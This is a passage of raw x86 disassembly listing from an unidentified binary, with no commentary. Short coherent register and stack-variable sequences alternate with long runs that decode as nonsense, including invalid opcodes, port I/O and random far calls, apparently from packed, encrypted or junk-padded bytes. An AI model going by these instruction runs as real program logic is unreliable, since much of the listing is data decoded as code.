  406d19:	xor    DWORD PTR [ebp+eax*8-0x5538d9e0],edx
  406d20:	xchg   edx,eax
  406d21:	pusha  
  406d22:	inc    eax
  406d23:	push   cs
  406d24:	xor    DWORD PTR ds:0xd2f45b10,0xd0d59c5
  406d2e:	add    eax,0x915b21d5
  406d33:	int    0xe1
  406d35:	test   DWORD PTR [edi+0x5c5bfa3],ebx
  406d3b:	jle    0x406ccf
  406d3d:	xchg   ecx,eax
  406d3e:	(bad)  
  406d3f:	pop    ds
  406d40:	mov    eax,ds:0x8b1ee1c1
  406d45:	dec    ebp
  406d46:	in     al,dx
  406d47:	xor    edx,edx
  406d49:	or     eax,edx
  406d4b:	mov    cl,BYTE PTR [eax+ecx*1]
  406d4e:	mov    eax,DWORD PTR [ebp-0x34]
  406d51:	add    BYTE PTR [eax],cl
  406d53:	mov    eax,DWORD PTR [ebp-0x60]
  406d56:	mov    ecx,DWORD PTR [ebp-0x5c]
  406d59:	shrd   eax,ecx,0x2
  406d5d:	shr    ecx,0x2
  406d60:	mov    ecx,DWORD PTR [ebp-0x60]
  406d63:	mov    edx,DWORD PTR [ebp-0x5c]
  406d66:	xor    eax,edi
  406d68:	xor    edx,edx
  406d6a:	or     eax,edx
  406d6c:	lea    eax,[ebp+eax*1-0x4]
  406d70:	mov    DWORD PTR [ebp-0x34],eax
  406d73:	mov    eax,DWORD PTR [ebp-0x60]
  406d76:	shl    ecx,0x1e
  406d79:	mov    ecx,DWORD PTR [ebp-0x5c]
  406d7c:	shrd   eax,ecx,0x2
  406d80:	shr    ecx,0x2
  406d83:	mov    ecx,DWORD PTR [ebp-0x60]
  406d86:	mov    edx,DWORD PTR [ebp-0x5c]
  406d89:	xor    eax,edi
  406d8b:	xor    edx,edx
  406d8d:	or     eax,edx
  406d8f:	mov    edx,DWORD PTR [ebp+0x14]
  406d92:	shl    ecx,0x1e
  406d95:	mov    ecx,DWORD PTR [ebp-0x14]
  406d98:	mov    cl,BYTE PTR [eax+ecx*1]
  406d9b:	mov    eax,DWORD PTR [ebp-0x34]
  406d9e:	or     BYTE PTR [eax],cl
  406da0:	mov    eax,DWORD PTR [ebp+0x10]
  406da3:	jmp    0x407181
  406da8:	fcmovnb st,st(6)
  406daa:	int3   
  406dab:	xchg   edi,eax
  406dac:	lods   al,BYTE PTR ds:[esi]
  406dad:	jnp    0x406dc9
  406daf:	sbb    cl,BYTE PTR [edi+0x376a0603]
  406db5:	pop    ecx
  406db6:	mov    ebx,0x188b0ab0
  406dbb:	sbb    BYTE PTR [esi+0x49181812],bl
  406dc1:	(bad)  [edx+0x61505831]
  406dc7:	add    esi,DWORD PTR [eax+0x57c30a0e]
  406dcd:	mov    al,ds:0xb7dd80dc
  406dd2:	cdq    
  406dd3:	clc    
  406dd4:	mov    al,0x92
  406dd6:	and    DWORD PTR [edx],ecx
  406dd8:	fsin   
  406dda:	popf   
  406ddb:	mov    ch,0xea
  406ddd:	push   ds
  406dde:	fs repz inc edx
  406de1:	inc    edx
  406de2:	xchg   edx,eax
  406de3:	or     edi,DWORD PTR [ecx-0x3233481e]
  406de9:	push   eax
  406dea:	imul   edi,DWORD PTR [ecx-0x3b9517e2],0x45
  406df1:	ja     0xdd6ed430
  406df7:	mov    esi,esp
  406df9:	sub    bh,BYTE PTR [eax-0x39]
  406dfc:	jns    0x406e3e
  406dfe:	in     al,0x2b
  406e00:	fiadd  DWORD PTR [edi-0x261719c5]
  406e06:	ja     0x406e16
  406e08:	mov    al,0xfe
  406e0a:	inc    ebx
  406e0b:	rol    DWORD PTR [edx+ebp*4+0x53],0xe9
  406e10:	ins    BYTE PTR es:[edi],dx
  406e11:	pop    esp
  406e12:	pop    edi
  406e13:	fidivr DWORD PTR [edx]
  406e15:	mov    cl,al
  406e17:	or     cl,ch
  406e19:	or     DWORD PTR [ecx-0x1c4da891],eax
  406e1f:	mov    DWORD PTR [edi+0xb],edx
  406e22:	mov    edx,0xd1adf29
  406e27:	sbb    eax,0xa6faac8a
  406e2c:	mov    edi,0x9094f316
  406e31:	(bad)  [esi]
  406e33:	fadd   QWORD PTR ss:[esi+0x54613e6c]
  406e3a:	xchg   DWORD PTR [edx],esp
  406e3c:	scas   eax,DWORD PTR es:[edi]
  406e3d:	mov    bh,0x95
  406e3f:	inc    edx
  406e40:	mov    ah,0x4f
  406e42:	mov    ebp,0x62f450da
  406e47:	fimul  DWORD PTR [ebp+0x3b]
  406e4a:	clc    
  406e4b:	xor    cl,ah
  406e4d:	je     0x406e72
  406e4f:	scas   al,BYTE PTR es:[edi]
  406e50:	pop    esp
  406e51:	ficomp WORD PTR [ecx-0xd3a0c13]
  406e57:	mov    ds:0x193e037e,al
  406e5c:	js     0x406e63
  406e5e:	mov    al,dh
  406e60:	sbb    ebp,DWORD PTR [eax-0x76]
  406e63:	push   esp
  406e64:	retf   
  406e65:	adc    eax,0x19e39c62
  406e6a:	fcomp  DWORD PTR [ebp+0x6a]
  406e6d:	mov    DWORD PTR [ebp+edx*4+0x4],ebp
  406e71:	push   edi
  406e72:	std    
  406e73:	xchg   BYTE PTR [esi],al
  406e75:	imul   edx,DWORD PTR [esi-0x3005844f],0x465a51fe
  406e7f:	bound  edx,QWORD PTR [esp+ebp*2+0x75]
  406e83:	fs sbb al,0x98
  406e86:	sbb    BYTE PTR [ebx],cl
  406e88:	test   ecx,edx
  406e8a:	fsubr  DWORD PTR [edi+0x43]
  406e8d:	jge    0x406e91
  406e8f:	push   0xffffffd5
  406e91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e92:	call   DWORD PTR [ecx+0x22]
  406e95:	mov    bl,0xd2
  406e97:	jg     0x406eef
  406e99:	mov    ss,WORD PTR [ebx+0x4fe6eee5]
  406e9f:	adc    al,BYTE PTR [edx+esi*2+0x216f5663]
  406ea6:	dec    ecx
  406ea7:	cmp    eax,0x6fa8c1c7
  406eac:	neg    ebx
  406eae:	inc    ebp
  406eaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406eb0:	xchg   DWORD PTR [esi-0x1f8b5361],edi
  406eb6:	fld    DWORD PTR ds:0x90ae827c
  406ebc:	fwait
  406ebd:	ja     0x406e6b
  406ebf:	test   esi,0xafd985ed
  406ec5:	call   0x596a:0x3e00cb8f
  406ecc:	aaa    
  406ecd:	ss cwde 
  406ecf:	add    eax,0xa1d5303a
  406ed4:	xchg   BYTE PTR [ecx-0x3eda85b0],dh
  406eda:	jg     0x406eff
  406edc:	xchg   ebx,eax
  406edd:	clc    
  406ede:	mov    WORD PTR [ecx-0xc94c454],es
  406ee4:	sub    al,dh
  406ee6:	lahf   
  406ee7:	clc    
  406ee8:	sti    
  406ee9:	xchg   ebx,eax
  406eea:	(bad)  
  406eec:	fist   WORD PTR [ebx+0x3ea026d9]
  406ef2:	lods   eax,DWORD PTR ds:[esi]
  406ef3:	jg     0x406f71
  406ef5:	out    dx,al
  406ef6:	fsub   QWORD PTR [edi-0x45]
  406ef9:	std    
  406efa:	cli    
  406efb:	xor    DWORD PTR [edi],ebx
  406efd:	sub    ebx,esi
  406eff:	fistp  WORD PTR [ecx]
  406f01:	adc    eax,0xa236e9c5
  406f06:	jnp    0x406f5f
  406f08:	ja     0x406ec7
  406f0a:	rol    DWORD PTR [esi],cl
  406f0c:	push   ecx
  406f0d:	pop    esi
  406f0e:	(bad)  
  406f0f:	out    0x42,eax
  406f11:	jle    0x406ef3
  406f13:	mov    edi,0x19d798a8
  406f18:	jne    0x406f96
  406f1a:	test   eax,0x17bfdae9
  406f1f:	xor    eax,0x323ab9cc
  406f24:	xchg   esp,eax
  406f25:	test   DWORD PTR [edi+0x18],0xc95655ee
  406f2c:	shr    DWORD PTR es:[esi],1
  406f2f:	mov    esi,0x25b6008a
  406f34:	jnp    0x406edf
  406f36:	jecxz  0x406fb5
  406f38:	xor    al,0x7e
  406f3a:	imul   ebp,DWORD PTR [ecx-0x3b],0xffffffb9
  406f3e:	mov    ecx,0x6341216f
  406f43:	in     eax,dx
  406f44:	fimul  DWORD PTR [ecx+0x33]
  406f47:	sbb    BYTE PTR [ecx-0x363975cf],dh
  406f4d:	or     cl,BYTE PTR [ecx-0x28]
  406f50:	retf   0x793b
  406f53:	loop   0x406f69
  406f55:	lds    esp,FWORD PTR [ecx+0x54]
  406f58:	add    BYTE PTR [edx-0x3cd25226],ch
  406f5e:	mov    ds:0x730fb881,al
  406f63:	pushf  
  406f64:	imul   ecx,DWORD PTR [edi+0x68348f9c],0x70
  406f6b:	mov    ch,BYTE PTR [edi]
  406f6d:	(bad)  
  406f6e:	and    BYTE PTR [esi+0x5c],ah
  406f71:	in     al,0x85
  406f73:	jge    0x406f8e
  406f75:	jb     0x406f0f
  406f77:	cld    
  406f78:	or     eax,0xb28b86c7
  406f7d:	inc    edx
  406f7e:	xor    eax,0xbd71d6d4
  406f83:	mov    esi,DWORD PTR [eax+0x70926ee0]
  406f89:	adc    edi,esi
  406f8b:	jmp    ebp
  406f8d:	daa    
  406f8e:	lods   eax,DWORD PTR ds:[esi]
  406f8f:	sbb    edi,DWORD PTR [ecx]
  406f91:	scas   eax,DWORD PTR es:[edi]
  406f92:	popa   
  406f93:	mov    eax,ds:0xab2c6687
  406f98:	icebp  
  406f99:	fimul  DWORD PTR [ecx-0x19]
  406f9c:	fmul   DWORD PTR [edi+edx*4-0x71]
  406fa0:	(bad)  
  406fa1:	xchg   esp,eax
  406fa2:	imul   edi,DWORD PTR [ebx-0xd],0xffffffad
  406fa6:	inc    ecx
  406fa7:	mov    ebx,0x2489cbff
  406fac:	xchg   ecx,eax
  406fad:	mov    WORD PTR [ebx-0x15],?
  406fb0:	sub    eax,DWORD PTR [ecx-0x42666af4]
  406fb6:	sti    
  406fb7:	(bad)  
  406fb8:	in     al,0x3d
  406fba:	mov    DWORD PTR [edi+0x52],ebp
  406fbd:	out    dx,eax
  406fbe:	mov    ecx,DWORD PTR fs:[eax-0x2]
  406fc2:	xchg   DWORD PTR [edx-0x293c6664],edx
  406fc8:	out    0xbc,eax
  406fca:	loope  0x40700b
  406fcc:	pop    es
  406fcd:	test   eax,0x747f0881
  406fd2:	and    dh,ch
  406fd4:	stc    
  406fd5:	dec    esp
  406fd6:	or     BYTE PTR [ebp-0xf],cl
  406fd9:	xor    DWORD PTR [ebp-0x4e],eax
  406fdc:	rol    BYTE PTR [esi-0x6a0041b6],0xcc
  406fe3:	aam    0x20
  406fe5:	dec    esp
  406fe6:	arpl   WORD PTR [esi+0x1c8f0015],dx
  406fec:	int3   
  406fed:	add    eax,0x90b05966
  406ff2:	clc    
  406ff3:	cmp    al,0x60
  406ff5:	and    ah,0x88
  406ff8:	popf   
  406ff9:	sbb    eax,0x447620e6
  406ffe:	mov    al,ds:0xc74c9c17
  407003:	ret    0x36f9
  407006:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407007:	xor    al,0x56
  407009:	fbld   TBYTE PTR [ebx+edi*8-0x1734e1ab]
  407010:	or     al,0x30
  407012:	(bad)  
  407013:	pop    ss
  407014:	(bad)  
  407015:	mov    bh,0x92
  407017:	adc    eax,0xc8e8f4e9
  40701c:	inc    ecx
  40701d:	mov    ah,dh
  40701f:	cmp    ecx,DWORD PTR [ebx-0x7e]
  407022:	sub    eax,0x27e556e3
  407027:	mov    eax,ds:0x2b0ea60c
  40702c:	ror    ah,0xb5
  40702f:	mov    bh,0xd
  407031:	ins    DWORD PTR es:[edi],dx
  407032:	cmp    BYTE PTR [ebp+ebx*4-0x69],ch
  407036:	and    DWORD PTR [ecx+edi*1],ebx
  407039:	and    ch,0xba
  40703c:	test   BYTE PTR [ecx],ch
  40703e:	lock retf 0x768d
  407042:	cli    
  407043:	mov    ebx,0xbc530188
  407048:	xchg   ebx,eax
  407049:	adc    BYTE PTR [esi+0xdd53d8d],dl
  40704f:	mov    edi,0x264bd457
  407054:	mov    al,ds:0x78398c78
  407059:	stos   DWORD PTR es:[edi],eax
  40705a:	mov    bh,0xff
  40705c:	aam    0xe3
  40705e:	stos   DWORD PTR es:[edi],eax
  40705f:	add    al,0x2e
  407061:	xchg   DWORD PTR [edx],ebx
  407063:	dec    eax
  407064:	test   al,0xfc
  407066:	cmp    DWORD PTR [edx+0x76009bc7],0x29
  40706d:	xor    eax,0x25769436
  407072:	sub    BYTE PTR [eax+0x6ffbce19],ah
  407078:	(bad)  [edi+edx*4]
  40707b:	push   cs
  40707c:	popf   
  40707d:	clc    
  40707e:	xchg   ebx,eax
  40707f:	jp     0x4070c2
  407081:	fsub   DWORD PTR [esp+ecx*2]
  407084:	push   ss
  407085:	test   eax,0x75bd6885
  40708a:	lods   al,BYTE PTR ds:[esi]
  40708b:	fcomp  QWORD PTR [edi]
  40708d:	jno    0x40705c
  40708f:	adc    DWORD PTR cs:[ebx+0x1e188e2f],edi
  407096:	xchg   esp,eax
  407097:	and    ch,al
  407099:	mov    al,ds:0x6ebbc4b7
  40709e:	jp     0x407091
  4070a0:	test   DWORD PTR [ebx+0x18],edi
  4070a3:	aaa    
  4070a4:	xchg   edx,eax
  4070a5:	xchg   esp,eax
  4070a6:	sbb    BYTE PTR [ecx-0x6b9b87ff],dl
  4070ac:	aaa    
  4070ad:	push   esp
  4070ae:	jb     0x40703e
  4070b0:	ins    BYTE PTR es:[edi],dx
  4070b1:	mov    al,ds:0xc10b09a0
  4070b6:	sub    eax,0x427a7338
  4070bb:	loop   0x407107
  4070bd:	xchg   edx,eax
  4070be:	inc    edi
  4070bf:	repnz ror DWORD PTR [ebx+0x9fc471d],1
  4070c6:	aad    0xfc
  4070c8:	stc    
  4070c9:	sub    eax,0x4bf12c0f
  4070ce:	push   edi
  4070cf:	ret    
  4070d0:	add    DWORD PTR [edx],0xa68ef41
  4070d6:	pusha  
  4070d7:	in     eax,dx
  4070d8:	push   es
  4070d9:	inc    ebx
  4070da:	nop
  4070db:	ja     0x40708b
  4070dd:	sub    bh,dh
  4070df:	icebp  
  4070e0:	clc    
  4070e1:	mov    eax,0xb4a05e2b
  4070e6:	add    al,0x6d
  4070e8:	jmp    0x4070d8
  4070ea:	pop    esi
  4070eb:	push   edx
  4070ec:	or     al,BYTE PTR ds:0x18744bbf
  4070f2:	dec    ecx
  4070f3:	sbb    al,cl
  4070f5:	xchg   esp,eax
  4070f6:	cld    
  4070f7:	xchg   ebx,eax
  4070f8:	dec    ebx
  4070f9:	mov    esi,es
  4070fb:	pop    edi
  4070fc:	out    0x92,al
  4070fe:	inc    ebp
  4070ff:	enter  0xc2e2,0x67
  407103:	mov    ah,ch
  407105:	jo     0x407183
  407107:	jge    0x40710b
  407109:	dec    edx
  40710a:	and    DWORD PTR [eax],ebx
  40710c:	pushf  
  40710d:	cli    
  40710e:	pop    esp
  40710f:	mov    BYTE PTR [edx+esi*1],bl
  407112:	(bad)  
  407113:	fcmovu st,st(7)
  407115:	mov    dl,0x67
  407117:	mov    ds,WORD PTR [esp+ebp*4-0x7e10433f]
  40711e:	and    eax,0x5035e8f9
  407123:	pop    edx
  407124:	js     0x407167
  407126:	xchg   BYTE PTR [ebp+0x6b9c0fa2],ch
  40712c:	sub    eax,DWORD PTR [ebx+0x73387bdf]
  407132:	mov    esi,0x5f018d8f
  407137:	loope  0x4071ac
  407139:	mov    al,ds:0x97472377
  40713e:	xchg   BYTE PTR [ebp+edi*8-0x74],al
  407142:	push   ebp
  407143:	test   ebp,eax
  407145:	mov    ebp,0x6950618f
  40714a:	lds    ecx,FWORD PTR [esi+0x4b61bb4f]
  407150:	jae    0x4071c3
  407152:	push   ds
  407153:	push   0x52341389
  407158:	test   edi,ebp
  40715a:	xor    BYTE PTR [ecx+0x66],0x62
  40715e:	retf   
  40715f:	mov    ds:0x8aa643dd,al
  407164:	cs loopne 0x40718b
  407167:	imul   esp,DWORD PTR [edi+0x32c8d7c6],0xffffffe1
  40716e:	pop    esp
  40716f:	fiadd  WORD PTR [esi]
  407171:	stc    
  407172:	xchg   edx,eax
  407173:	xchg   DWORD PTR [eax+0x70],ebp
  407176:	mov    ebx,0x8ceb9c1d
  40717b:	xor    ah,BYTE PTR [esi-0x3f]
  40717e:	not    DWORD PTR [ecx+0xfc88b97]
  407184:	lods   al,BYTE PTR ds:[esi]
  407185:	rol    DWORD PTR [edx],1
  407187:	shl    eax,0x1e
  40718a:	shr    edx,0x2
  40718d:	mov    DWORD PTR [ebp+0x14],edx
  407190:	mov    DWORD PTR [ebp+0x14],eax
  407193:	xor    edx,edx
  407195:	mov    eax,ecx
  407197:	xor    eax,edi
  407199:	or     eax,edx
  40719b:	mov    edx,DWORD PTR [ebp-0x4]
  40719e:	dec    eax
  40719f:	not    eax
  4071a1:	and    eax,edx
  4071a3:	xor    ecx,edi
  4071a5:	mov    DWORD PTR [ebp-0x4],eax
  4071a8:	mov    DWORD PTR [ebp+0x14],ecx
  4071ab:	xor    eax,eax
  4071ad:	or     DWORD PTR [ebp+0x14],eax
  4071b0:	mov    eax,DWORD PTR [ebp-0x50]
  4071b3:	jmp    0x407591
  4071b8:	fiadd  DWORD PTR [ecx-0x1d]
  4071bb:	mov    ah,BYTE PTR [edx]
  4071bd:	sub    bl,BYTE PTR [edx+0x21]
  4071c0:	jnp    0x407190
  4071c2:	mov    ch,0x7c
  4071c4:	sbb    eax,0x907c87df
  4071c9:	test   DWORD PTR [eax],ebx
  4071cb:	sbb    BYTE PTR [esi+0x6f181812],bl
  4071d1:	inc    edx
  4071d2:	aad    0xde
  4071d4:	push   0xffffffc4
  4071d6:	dec    eax
  4071d7:	pop    ds
  4071d8:	fwait
  4071d9:	push   0xff4327ff
  4071de:	outs   dx,BYTE PTR ds:[esi]
  4071df:	push   edx
  4071e0:	sbb    BYTE PTR [edi+0x36],cl
  4071e3:	sbb    dl,dl
  4071e5:	dec    eax
  4071e6:	pop    esi
  4071e7:	arpl   WORD PTR [ebx],di
  4071e9:	inc    ebp
  4071ea:	or     eax,0x2e4f8f7f
  4071ef:	ret    0x734f
  4071f2:	cs (bad) 
  4071f4:	push   es
  4071f5:	cmp    BYTE PTR ds:0xeb292198,bl
  4071fb:	xor    cl,dh
  4071fd:	mov    bh,0x6e
  4071ff:	pop    es
  407200:	sbb    eax,0x32a85544
  407205:	ins    DWORD PTR es:[edi],dx
  407206:	cmp    al,0x40
  407208:	add    al,0xe4
  40720a:	sub    al,0x8a
  40720c:	mov    dl,0x78
  40720e:	sub    al,BYTE PTR [ecx-0x5c518e71]
  407214:	fdivr  st(3),st
  407216:	cvtps2pi mm4,QWORD PTR [ecx+0x15]
  40721a:	sti    
  40721b:	lds    esi,FWORD PTR [edi*4+0x34e1bdee]
  407222:	dec    edi
  407223:	mov    bh,0xc0
  407225:	and    dl,BYTE PTR [esi]
  407227:	std    
  407228:	fs addr16 loop 0x4071db
  40722c:	retf   0x1737
  40722f:	xor    eax,0xac76ff69
  407234:	je     0x40725d
  407236:	inc    edx
  407237:	mov    eax,DWORD PTR [esi-0x41445eaf]
  40723d:	fs add al,0xc0
  407240:	adc    ebx,DWORD PTR [edi-0x1da713bd]
  407246:	push   edx
  407247:	mov    bl,ah
  407249:	into   
  40724a:	jecxz  0x407229
  40724c:	fdivr  st,st(4)
  40724e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40724f:	clc    
  407250:	pop    ds
  407251:	in     al,dx
  407252:	mov    esi,0xbf8ad7bf
  407257:	inc    ecx
  407258:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407259:	dec    ecx
  40725a:	dec    ebx
  40725b:	hlt    
  40725c:	mov    cl,0x57
  40725e:	push   esp
  40725f:	xchg   ebx,eax
  407260:	push   es
  407261:	sub    edi,DWORD PTR [ebx+0x14]
  407264:	cmp    eax,DWORD PTR [ebp+0x7b0e25c9]
  40726a:	dec    eax
  40726b:	mov    ebp,0xa8ee0a4e
  407270:	or     BYTE PTR [ecx+0x22],bh
  407273:	push   esi
  407274:	pop    ebp
  407275:	adc    ah,ah
  407277:	jl     0x407295
  407279:	retf   
  40727a:	xchg   esp,eax
  40727b:	lods   eax,DWORD PTR ds:[esi]
  40727c:	adc    DWORD PTR [eax+ebx*4+0x5e8ca6f4],0x15
  407284:	adc    eax,0xa0fc6999
  407289:	pop    ebp
  40728a:	setg   BYTE PTR [ebp+ecx*8+0x2141df15]
  407292:	ds loopne 0x407259
  407295:	add    al,0x2e
  407297:	inc    ebp
  407298:	inc    edx
  407299:	adc    ecx,DWORD PTR [ebx]
  40729b:	enter  0x4ed9,0xdc
  40729f:	mov    bl,0x68
  4072a1:	out    dx,eax
  4072a2:	rcl    BYTE PTR [ebx],0x8
  4072a5:	std    
  4072a6:	or     DWORD PTR [ebx],ebx
  4072a8:	mov    cl,0x18
  4072aa:	push   ebx
  4072ab:	ret    0xe043
  4072ae:	push   edx
  4072af:	call   0xec4e:0xd976ae9e
  4072b6:	pop    edx
  4072b7:	dec    ebp
  4072b8:	inc    edx
  4072b9:	pop    edx
  4072ba:	cmp    eax,0xe5f752a5
  4072bf:	jb     0x407243
  4072c1:	push   esp
  4072c2:	mov    edi,ecx
  4072c4:	shl    BYTE PTR [ebp+ecx*4+0x66],0x9c
  4072c9:	push   0xf1f7820b
  4072ce:	je     0x4072c9
  4072d0:	jno    0x407331
  4072d2:	fsub   st,st(0)
  4072d4:	jo     0x40728f
  4072d6:	inc    ecx
  4072d7:	cld    
  4072d8:	sbb    BYTE PTR [eax],ah
  4072da:	sbb    eax,0x6b26c0c
  4072df:	loope  0x4072ea
  4072e1:	loope  0x4072a5
  4072e3:	xor    BYTE PTR [ecx+eax*4],ch
  4072e6:	in     al,dx
  4072e7:	int    0xe
  4072e9:	sbb    bh,BYTE PTR [ebp-0x7d80d6ac]
  4072ef:	ins    BYTE PTR es:[edi],dx
  4072f0:	sti    
  4072f1:	int3   
  4072f2:	and    al,0x64
  4072f4:	pop    edi
  4072f5:	lds    edi,FWORD PTR [eax+0xe64b9cb]
  4072fb:	fidivr WORD PTR [ebp+0x78]
  4072fe:	retf   
  4072ff:	cmp    edi,DWORD PTR [edi+ecx*4-0x14daebb9]
  407306:	inc    BYTE PTR [edx-0x56]
  407309:	and    ah,cl
  40730b:	mov    ds,eax
  40730d:	push   0xb774a05f
  407312:	push   ds
  407313:	aad    0x71
  407315:	mov    ecx,edx
  407317:	sbb    BYTE PTR [edx],cl
  407319:	or     al,0xcb
  40731b:	or     al,0xa5
  40731d:	pop    ds
  40731e:	pop    edx
  40731f:	shr    DWORD PTR [edi-0xb14bce6],1
  407325:	or     BYTE PTR [ebx],dh
  407327:	mov    edi,0xac3fe1aa
  40732c:	retf   
  40732d:	stc    
  40732e:	cmp    eax,0x75b0678a
  407333:	test   eax,0xac3ebb28
  407338:	sbb    DWORD PTR [eax-0x76704e9a],esi
  40733e:	std    
  40733f:	adc    ch,dl
  407341:	adc    esi,eax
  407343:	mov    eax,0x322c436f
  407348:	add    eax,0xa9afabe7
  40734d:	jl     0x4073bd
  40734f:	sub    eax,0x857154ae
  407354:	lods   eax,DWORD PTR ds:[esi]
  407355:	and    al,BYTE PTR [esp]
  407358:	mov    esi,0xaef4e60d
  40735d:	test   dh,ah
  40735f:	popf   
  407360:	sbb    al,BYTE PTR [ecx+0x68]
  407363:	add    DWORD PTR [esi],ecx
  407365:	cld    
  407366:	and    BYTE PTR [edx-0x16c28fb9],ch
  40736c:	fs repnz pop gs
  407370:	mov    ds:0x602dc42c,al
  407375:	scas   al,BYTE PTR es:[edi]
  407376:	fwait
  407377:	xor    ch,BYTE PTR ds:0x1d110ed
  40737d:	sahf   
  40737e:	cmp    eax,0xa89cbfef
  407383:	loope  0x4073f1
  407385:	xlat   BYTE PTR ds:[ebx]
  407386:	dec    ebp
  407387:	add    esi,edi
  407389:	arpl   WORD PTR [esi],cx
  40738b:	and    al,0x6f
  40738d:	addr16 mov ds:0xca83,al
  407391:	xchg   ebp,eax
  407392:	mov    ecx,0x69b5929b
  407397:	dec    eax
  407398:	xchg   ebx,eax
  407399:	sub    DWORD PTR [ebx-0x192b07a2],edi
  40739f:	out    dx,eax
  4073a0:	cld    
  4073a1:	das    
  4073a2:	int3   
  4073a3:	mov    bl,0xde
  4073a5:	lea    eax,[eax]
  4073a7:	(bad)  
  4073a8:	lahf   
  4073a9:	mov    ch,0xf7
  4073ab:	addr16 xchg ebp,eax
  4073ad:	jns    0x4073af
  4073af:	stos   DWORD PTR es:[edi],eax
  4073b0:	lods   eax,DWORD PTR ds:[esi]
  4073b1:	fadd   QWORD PTR [esi-0x13475c16]
  4073b7:	daa    
  4073b8:	aam    0x9b
  4073ba:	or     eax,DWORD PTR [esi]
  4073bc:	xchg   ch,bl
  4073be:	fist   WORD PTR [ebp-0x3f]
  4073c1:	adc    BYTE PTR [eax+ebx*8],dl
  4073c4:	add    eax,0xd2f0702f
  4073c9:	push   esp
  4073ca:	pop    ebp
  4073cb:	je     0x4073fe
  4073cd:	push   edx
  4073ce:	dec    ebp
  4073cf:	test   BYTE PTR [esi+0xf],bl
  4073d2:	and    DWORD PTR [edx-0x2c059b1c],eax
  4073d8:	gs scas eax,DWORD PTR es:[edi]
  4073da:	sbb    DWORD PTR [eax],esp
  4073dc:	mov    al,ds:0x2c705085
  4073e1:	sub    BYTE PTR [ebx-0x7743dcc3],ch
  4073e7:	xlat   BYTE PTR ds:[ebx]
  4073e8:	inc    esp
  4073e9:	mov    esi,0xda1ee785
  4073ee:	xor    BYTE PTR gs:[eax],bl
  4073f1:	add    al,0xbb
  4073f3:	inc    eax
  4073f4:	xor    eax,0x26636484
  4073f9:	adc    BYTE PTR [edi],al
  4073fb:	test   DWORD PTR [ebp+0x1a],esi
  4073fe:	push   0x17
  407400:	mov    ebx,0x53037ab4
  407405:	add    DWORD PTR [ebx],edi
  407407:	and    dl,cl
  407409:	int    0xf7
  40740b:	mov    DWORD PTR [bp+0x223a],0x10f3f344
  407414:	push   eax
  407415:	fsubr  st(4),st
  407417:	mov    edx,0x613a1764
  40741c:	push   ecx
  40741d:	xchg   edi,eax
  40741e:	jle    0x4073e0
  407420:	mov    DWORD PTR [edx+0x4a],ebp
  407423:	sub    al,0xae
  407425:	ficomp WORD PTR [ebx+ebp*8]
  407428:	mov    eax,ds:0x4082b2be
  40742d:	into   
  40742e:	pop    edx
  40742f:	pop    ecx
  407430:	jo     0x407474
  407432:	fmul   QWORD PTR [edi]
  407434:	pop    esp
  407435:	out    0xf8,al
  407437:	and    al,BYTE PTR [ebx+ebp*2+0x4fe9ec4a]
  40743e:	xor    al,0xbc
  407440:	mov    dl,0x53
  407442:	jg     0x40744e
  407444:	test   eax,0x14873e1d
  407449:	add    DWORD PTR [ebx],esi
  40744b:	mov    dl,0xe2
  40744d:	jne    0x407440
  40744f:	dec    ebp
  407450:	xchg   DWORD PTR [ebx+0x1c925342],edx
  407456:	nop
  407457:	imul   eax,DWORD PTR [esi+0x38],0xee309e8a
  40745e:	lea    ecx,[esi+0xb]
  407461:	(bad)  
  407462:	scas   eax,DWORD PTR es:[edi]
  407463:	jbe    0x40740e
  407465:	dec    ecx
  407466:	pusha  
  407467:	test   al,0xcf
  407469:	int3   
  40746a:	xrelease mov DWORD PTR [eax+0x3e],ebp
  40746e:	push   eax
  40746f:	sub    DWORD PTR [eax+0x6923eda0],ecx
  407475:	shr    DWORD PTR [ecx+ebx*2-0x77],cl
  407479:	push   ds
  40747a:	inc    esi
  40747b:	push   ebp
  40747c:	inc    esi
  40747d:	xchg   DWORD PTR [ecx],edx
  40747f:	stos   DWORD PTR es:[edi],eax
  407480:	cwde   
  407481:	daa    
  407482:	ins    DWORD PTR es:[edi],dx
  407483:	or     eax,0x9b187667
  407488:	js     0x407473
  40748a:	ins    BYTE PTR es:[edi],dx
  40748b:	adc    eax,0xb64ebc91
  407490:	mov    dh,0xcd
  407492:	mov    ah,0xda
  407494:	(bad)  
  407495:	push   ds
  407496:	stc    
  407497:	in     al,dx
  407498:	sub    ebp,DWORD PTR [edx+0x5485adb5]
  40749e:	xchg   esi,eax
  40749f:	ins    BYTE PTR es:[edi],dx
  4074a0:	hlt    
  4074a1:	js     0x407453
  4074a3:	out    0xd,eax
  4074a5:	mov    ds:0xc30d663e,al
  4074aa:	retf   0x4534
  4074ad:	lods   al,BYTE PTR ds:[esi]
  4074ae:	xchg   edi,eax
  4074af:	arpl   WORD PTR [ebp+0x1586f7fb],sp
  4074b5:	add    DWORD PTR [ebx+0x684c965e],ecx
  4074bb:	jmp    FWORD PTR [edi+ebx*4-0x19]
  4074bf:	in     al,0xb
  4074c1:	imul   ebx,DWORD PTR [eax],0x7099c3e6
  4074c7:	or     eax,edx
  4074c9:	aas    
  4074ca:	mov    edx,0x2f7ffc8
  4074cf:	pop    edi
  4074d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074d1:	jb     0x4074d2
  4074d3:	sbb    DWORD PTR [edi-0x34],0x2e3dedc0
  4074da:	xchg   ebx,eax
  4074db:	out    0xa8,eax
  4074dd:	cdq    
  4074de:	mov    ah,0xab
  4074e0:	lea    esi,[eax+0x16b73b32]
  4074e6:	pop    es
  4074e7:	mov    eax,0x1a182373
  4074ec:	cmp    al,0x62
  4074ee:	das    
  4074ef:	lods   eax,DWORD PTR ds:[esi]
  4074f0:	cs stos BYTE PTR es:[edi],al
  4074f2:	(bad)  
  4074f3:	push   edi
  4074f4:	js     0x4074da
  4074f6:	xor    BYTE PTR [ebx],cl
  4074f8:	scas   al,BYTE PTR es:[edi]
  4074f9:	jbe    0x4074d1
  4074fb:	test   BYTE PTR [eax+0x415c070a],cl
  407501:	ret    0xe077
  407504:	inc    ebx
  407505:	jl     0x407506
  407507:	or     DWORD PTR [ebx-0x4f],ecx
  40750a:	ja     0x4074b6
